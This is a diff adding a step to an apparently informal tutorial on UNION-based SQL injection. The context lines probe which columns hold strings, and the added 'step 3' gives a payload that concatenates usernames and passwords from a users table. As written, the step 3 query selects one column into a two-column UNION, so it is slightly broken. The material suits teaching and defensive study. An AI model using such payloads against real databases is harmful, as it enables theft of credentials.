@@ -54,3 +54,9 @@ so we just check every value is it string(varchar) or not
 if we got an error then we try put 'a' in different column
 `SELECT a, b FROM table1 UNION SELECT NULL, 'a';`
 if it returns ours string 'a' then sql injection successful
+
+### step 3 - use exploit to get admin password or etc
+
+if we know what exactly column is varchar value then we can use it column to get usernames and passwords
+`SELECT a, b FROM table1 UNION SELECT username || '~' || password from users;`
+we use `||` sign that means CONCAT in most SQL databases to concat usernames and password in one column
